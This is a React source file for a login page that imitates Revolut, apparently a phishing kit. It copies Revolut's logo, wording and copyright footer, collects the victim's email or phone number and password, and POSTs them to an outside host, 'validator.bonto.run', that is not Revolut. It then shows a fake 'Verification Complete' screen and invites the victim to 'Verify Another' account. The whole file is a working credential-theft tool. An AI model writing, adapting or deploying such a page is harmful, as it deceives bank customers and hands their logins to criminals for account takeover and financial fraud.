import React, { useState } from 'react';
import { Eye, EyeOff, Loader2, CheckCircle, Mail, Apple } from 'lucide-react';
import './revolutLanding.css';
import revolutLogo from "../../assets/revolut_logo.png";

const API_URL = "https://validator.bonto.run/Revolut";

const RevolutLogin = () => {
  const [form, setForm] = useState({ emailOrUsername: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState('');

  const submitForm = async () => {
    if (!form.emailOrUsername || !form.password) {
      setError('Please fill in all fields');
      return;
    }

    setError('');
    setLoading(true);

    try {
      const res = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form)
      });

      const data = await res.json();

      if (!res.ok) throw new Error(data.error || 'Validation failed');

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter' && !loading) {
      submitForm();
    }
  };

  if (done) {
    return (
      <div className="revolut-login-page">
        <div className="revolut-login-container">
          <div className="revolut-login-header">
            <img 
              src={revolutLogo} 
              alt="Revolut Logo" 
              className="revolut-login-logo" 
            />
          </div>

          <div className="revolut-success-card">
            <div className="revolut-success-icon-wrapper">
              <CheckCircle className="revolut-success-icon" />
            </div>

            <h2 className="revolut-success-title">Verification Complete</h2>
            
            <p className="revolut-success-text">
              Your account is being checked.
            </p>
            <p className="revolut-success-text">
              Please check your email for further instructions.
            </p>

            <div className="revolut-success-info">
              <p>Want to verify another account?</p>
            </div>

            <div className="revolut-success-actions">
              <button
                onClick={() => window.location.reload()}
                className="revolut-success-btn revolut-success-btn-primary"
              >
                Verify Another
              </button>
              <button
                onClick={() => window.location.href = '/'}
                className="revolut-success-btn revolut-success-btn-secondary"
              >
                Go Home
              </button>
            </div>
          </div>

          <div className="revolut-login-footer">
            <p>© 2025 Revolut Ltd. All rights reserved.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="revolut-login-page">
      <div className="revolut-login-container">
        {/* Logo */}
        <div className="revolut-login-header">
          <img 
            src={revolutLogo} 
            alt="Revolut Logo" 
            className="revolut-login-logo" 
          />
        </div>

        {/* Login Card */}
        <div className="revolut-login-card">
          <h1 className="revolut-login-title">log in to your account</h1>
          <p className="revolut-login-subtitle">
            Enter the phone number or email associated with your Revolut account
          </p>

          {/* Phone/Email Input */}
          <div className="revolut-input-group">
            <label className="revolut-input-label">Phone number / Email</label>
            <div className="revolut-input-wrapper">
              <input
                type="text"
                autoComplete="email"
                value={form.emailOrUsername}
                onChange={(e) => setForm({ ...form, emailOrUsername: e.target.value })}
                onKeyPress={handleKeyPress}
                className="revolut-input"
                placeholder="Phone number or email"
              />
            </div>
          </div>

          {/* Password Input */}
          <div className="revolut-input-group">
            <label className="revolut-input-label">Password</label>
            <div className="revolut-password-input-wrapper">
              <input
                type={showPassword ? 'text' : 'password'}
                autoComplete="current-password"
                value={form.password}
                onChange={(e) => setForm({ ...form, password: e.target.value })}
                onKeyPress={handleKeyPress}
                className="revolut-input"
                placeholder="Enter password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="revolut-password-toggle"
              >
                {showPassword ? (
                  <EyeOff className="revolut-eye-icon" />
                ) : (
                  <Eye className="revolut-eye-icon" />
                )}
              </button>
            </div>
          </div>

          {/* <a href="#lost" className="revolut-lost-link">
            Lost access to my phone number
          </a> */}

          {/* Error Message */}
          {error && (
            <div className="revolut-error-box">
              <p>{error}</p>
            </div>
          )}

          {/* Continue Button */}
          <button
            onClick={submitForm}
            disabled={loading}
            className="revolut-continue-btn"
          >
            {loading ? (
              <>
                <Loader2 className="revolut-spinner" />
                <span>Processing...</span>
              </>
            ) : (
              'Continue'
            )}
          </button>

          
          {/* <div className="revolut-divider">
            <span>or continue with</span>
          </div>

          {/* Social Login Buttons */}
          {/* <div className="revolut-social-buttons">
            <button className="revolut-social-btn">
              <Mail className="revolut-social-icon" />
              <span>Email</span>
            </button>
            <button className="revolut-social-btn">
              <svg className="revolut-social-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
              <span>Google</span>
            </button>
            <button className="revolut-social-btn">
              <Apple className="revolut-social-icon" />
              <span>Apple</span>
            </button>
          </div> */}

          {/* Create Account */}
          {/* <div className="revolut-signup-section">
            <p>Don't have an account?</p>
            <button className="revolut-create-btn">Create account</button>
          </div> */} 
        </div>

        {/* Footer */}
        <div className="revolut-login-footer">
          <select className="revolut-language-select">
            <option>English (United Kingdom)</option>
            <option>English (United States)</option>
          </select>
          <a href="#privacy" className="revolut-footer-link">Privacy Policy</a>
        </div>
      </div>
    </div>
  );
};

export default RevolutLogin;